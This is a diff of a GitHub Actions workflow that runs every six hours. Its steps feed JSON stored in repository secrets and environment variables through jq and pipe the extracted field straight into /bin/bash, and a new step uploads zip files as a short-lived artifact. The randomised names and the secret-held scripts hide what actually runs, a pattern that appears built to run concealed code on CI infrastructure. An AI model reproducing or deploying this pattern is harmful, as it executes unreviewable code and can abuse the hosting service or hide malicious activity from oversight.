@@ -1,24 +1,27 @@
 name: duanhongriyu
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '44 3/6 * * *'
 
-jobs:  # 30723
+  schedule:
+    - cron: '20 3,9,15,21 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: duanhongriyu
         env:
-          ci5351: ${{ secrets.ci5351 }}
+          tjtg0739: ${{ secrets.tjtg0739 }}
         run: |
-          echo $ci5351 | jq -r .qw54571 | /bin/bash
-          echo $jsme7163 | jq -r .t126 | /bin/bash
-          echo $cnybw0 | jq -r .dme78868 | /bin/bash
-          echo $s66847 | jq -r .c8855 | /bin/bash
-          echo $fml404 | jq -r .d3495 | /bin/bash
-          echo $f230 | jq -r .c598 | /bin/bash
+          printf '%s' "$tjtg0739" | jq -r .fqc09 | /bin/bash
+          echo $ygn35581 | jq -r .mi13 | /bin/bash
+          echo $y9929 | jq -r .ocy4546 | /bin/bash
+          printf '%s' "$bh31" | jq -r .f3399 | /bin/bash
+          echo $ui3 | jq -r .lkxw15 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: v96FyMZk
+          path: "*.zip"
+          retention-days: 1
